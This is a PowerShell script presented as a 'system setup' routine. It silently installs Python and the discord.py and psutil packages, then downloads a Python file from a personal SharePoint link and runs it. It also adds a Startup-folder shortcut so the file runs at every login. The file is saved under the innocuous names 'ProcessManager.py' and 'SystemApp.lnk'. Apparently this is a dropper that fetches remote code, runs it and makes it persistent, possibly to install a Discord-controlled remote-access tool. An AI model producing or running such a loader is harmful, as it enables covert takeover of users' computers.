Write-Host "Starting system setup..." -ForegroundColor Cyan

# Check if Python is installed
try {
    python --version 2>$null
    Write-Host "Python is installed" -ForegroundColor Green
    $pythonInstalled = $true
} catch {
    Write-Host "Python not found, installing..." -ForegroundColor Yellow
    $pythonInstalled = $false
}

# Install Python if needed
if (-not $pythonInstalled) {
    Write-Host "Downloading Python..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_setup.exe"
    
    # Download Python
    (New-Object System.Net.WebClient).DownloadFile($pythonUrl, $installerPath)
    
    # Install Python
    Write-Host "Installing Python..." -ForegroundColor Yellow
    Start-Process -FilePath $installerPath -ArgumentList @(
        "/quiet",
        "InstallAllUsers=0", 
        "PrependPath=1",
        "Include_test=0",
        "Include_pip=1",
        "Include_launcher=0"
    ) -Wait
    
    Start-Sleep -Seconds 8
    Write-Host "Python installed successfully" -ForegroundColor Green
}

# Install packages
Write-Host "Installing required packages..." -ForegroundColor Yellow
Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", "discord.py", "psutil", "--user" -Wait

# Download main script
Write-Host "Downloading application..." -ForegroundColor Yellow
$scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
$scriptPath = "$env:USERPROFILE\ProcessManager.py"
(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $scriptPath)

Write-Host "Application downloaded to: $scriptPath" -ForegroundColor Green

# Run the script
Write-Host "Starting application..." -ForegroundColor Green
Start-Process -FilePath "python" -ArgumentList "`"$scriptPath`""

# Add to startup
Write-Host "Setting up startup..." -ForegroundColor Yellow
$startupPath = [Environment]::GetFolderPath("Startup")
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\SystemApp.lnk")
$shortcut.TargetPath = "python"
$shortcut.Arguments = "`"$scriptPath`""
$shortcut.WorkingDirectory = "$env:USERPROFILE"
$shortcut.Save()

Write-Host "Setup completed! Application will start automatically on next login." -ForegroundColor Green
Write-Host "Closing in 3 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 3
